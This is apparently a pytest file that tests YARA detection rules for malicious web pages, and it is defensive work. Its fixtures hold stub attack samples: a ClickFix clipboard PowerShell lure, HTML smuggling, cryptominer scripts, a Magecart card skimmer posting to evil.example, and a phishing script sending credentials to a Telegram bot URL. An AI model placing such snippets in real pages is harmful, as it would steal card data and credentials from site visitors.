"""YARA rule + scanner tests.

These tests skip if yara-python isn't installed, which is the same posture
the scanner takes at runtime. Run them locally with:

    pip install yara-python
    pytest services/sandbox-render/tests/test_yara.py -v
"""
from __future__ import annotations

import pathlib

import pytest

yara = pytest.importorskip("yara")  # noqa: F841

from app.yara_scan import YaraScanner  # noqa: E402

RULES_DIR = pathlib.Path(__file__).resolve().parent.parent / "rules"


@pytest.fixture(scope="module")
def scanner() -> YaraScanner:
    s = YaraScanner(RULES_DIR)
    assert s.enabled, "rules failed to compile"
    assert s.rule_count >= 4
    return s


# ---------- ClickFix ----------

CLICKFIX_PAGE = """
<html><body>
<h1>Verify you are human</h1>
<p>To continue, press Windows + R, then press Ctrl+V to paste, then press Enter.</p>
<script>
navigator.clipboard.writeText("powershell -EncodedCommand SQBuAHYAbwBrAGUA...");
</script>
</body></html>
""".encode()


def test_clickfix_full_pattern(scanner):
    matches, _ = scanner.scan(CLICKFIX_PAGE)
    rules = {m.rule for m in matches}
    assert "xgg_clickfix_instructions" in rules
    assert "xgg_clickfix_payload_in_clipboard" in rules


def test_clickfix_instructions_alone(scanner):
    # A docs page that mentions Win+R + paste should NOT trigger
    # because it lacks the "verify you are human" disguise cue.
    page = b"""
    <html><body><h1>Help</h1>
    <p>Press Win+R, paste this command, then press Enter to clean your cache.</p>
    </body></html>
    """
    matches, _ = scanner.scan(page)
    rules = {m.rule for m in matches}
    assert "xgg_clickfix_instructions" not in rules


# ---------- HTML smuggling ----------

HTML_SMUGGLING_PAGE = (
    b"<html><body><script>"
    b"const b = new Blob([Uint8Array.from(atob('"
    + (b"QUJDRA" * 600) + b"='), c => c.charCodeAt(0))]);"
    b"const u = URL.createObjectURL(b);"
    b"const a = document.createElement('a');"
    b"a.href = u; a.download = 'report.zip'; a.click();"
    b"</script></body></html>"
)


def test_html_smuggling(scanner):
    matches, _ = scanner.scan(HTML_SMUGGLING_PAGE)
    rules = {m.rule for m in matches}
    assert "xgg_html_smuggling" in rules


def test_html_smuggling_no_match_on_legit_blob(scanner):
    # A page using Blob legitimately (e.g. CSV download) without the
    # giant embedded payload should NOT match.
    page = (
        b"<html><body><script>"
        b"const b = new Blob(['hello,world\\n'], {type:'text/csv'});"
        b"const u = URL.createObjectURL(b);"
        b"document.querySelector('a').href = u;"
        b"</script></body></html>"
    )
    matches, _ = scanner.scan(page)
    rules = {m.rule for m in matches}
    assert "xgg_html_smuggling" not in rules


# ---------- Cryptojacker ----------

def test_cryptojacker_known_lib(scanner):
    page = b"<html><body><script src='https://coinhive.com/lib/coinhive.min.js'></script></body></html>"
    matches, _ = scanner.scan(page)
    rules = {m.rule for m in matches}
    assert "xgg_cryptojacker_known_libs" in rules


def test_cryptojacker_wasm_pattern(scanner):
    page = b"""
    <script>
    WebAssembly.instantiate(buf).then(m => {
      const miner = new m.exports.Miner({ threads: 4, pool: 'pool.minexmr.com' });
      // cryptonight
    });
    </script>
    """
    matches, _ = scanner.scan(page)
    rules = {m.rule for m in matches}
    assert "xgg_cryptojacker_wasm_miner_pattern" in rules


# ---------- Magecart ----------

def test_magecart_keylistener_with_exfil(scanner):
    page = b"""
    <html><body>
    <script>
    document.querySelector("input[name='card_number']").addEventListener('keyup', (e) => {
      fetch("https://evil.example/api/skim", { method: "POST", body: e.target.value });
    });
    document.querySelector("input[name='cvv']").addEventListener('keydown', () => {});
    document.querySelector("input[name='expiry_month']").addEventListener('blur', () => {});
    </script></body></html>
    """
    matches, _ = scanner.scan(page)
    rules = {m.rule for m in matches}
    assert "xgg_magecart_card_field_listener" in rules


# ---------- Phishing kit ----------

def test_phishing_kit_telegram_exfil(scanner):
    page = b"""
    <script>
    fetch("https://api.telegram.org/bot12345678:AAEhBOweik6ad9r_Q76aBcUZ1ZIzKtMqiBg/sendMessage?chat_id=-100123&text=" + creds);
    </script>
    """
    matches, _ = scanner.scan(page)
    rules = {m.rule for m in matches}
    assert "xgg_phishing_kit_telegram_exfil" in rules


# ---------- Scanner-level tests ----------

def test_scanner_empty_input(scanner):
    matches, ms = scanner.scan(b"")
    assert matches == []
    assert ms >= 0


def test_scanner_size_cap(scanner):
    # 6 MB of "a" should be truncated to MAX_SCAN_BYTES; should not throw.
    matches, _ = scanner.scan(b"a" * (6 * 1024 * 1024))
    # We don't assert empty — just that it didn't blow up.
    assert isinstance(matches, list)


def test_matches_have_reason_codes(scanner):
    """Every rule we ship must declare a reason_code in meta."""
    matches, _ = scanner.scan(CLICKFIX_PAGE)
    for m in matches:
        assert m.reason_code, f"rule {m.rule} missing reason_code"
        assert m.severity in {"low", "medium", "high", "critical"}, f"bad severity on {m.rule}"
